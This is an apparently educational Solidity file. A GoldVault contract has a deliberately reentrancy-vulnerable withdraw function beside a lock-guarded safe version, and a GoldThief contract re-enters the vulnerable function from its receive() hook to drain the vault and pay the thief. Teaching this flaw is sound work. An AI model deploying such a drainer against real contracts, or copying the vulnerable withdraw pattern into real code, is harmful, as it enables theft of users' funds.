// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
contract GoldVault {
    mapping(address => uint256) public balances;
    bool private locked;
    modifier noReentrant() {
        require(!locked, "No reentrancy allowed");
        locked = true;
        _;
        locked = false;
    }
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    function vulnerableWithdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        balances[msg.sender] = 0;
    }
    function safeWithdraw() external noReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
    function getVaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
contract GoldThief {
    GoldVault public vault;
    address public thiefOwner;

    constructor(address _vaultAddress) {
        vault = GoldVault(_vaultAddress);
        thiefOwner = msg.sender;
    }
    function attackVulnerable() external payable {
        require(msg.value >= 0.1 ether, "Need a little ETH to start");
        vault.deposit{value: msg.value}();
        vault.vulnerableWithdraw();
    }
    function attackSafe() external payable {
        vault.deposit{value: msg.value}();
        vault.safeWithdraw();
    }
    receive() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.vulnerableWithdraw();
        }
    }
    function stealLoot() external {
        require(msg.sender == thiefOwner, "Not the thief!");
        uint256 balance = address(this).balance;
        (bool success, ) = thiefOwner.call{value: balance}("");
        require(success, "Looting failed");
    }
}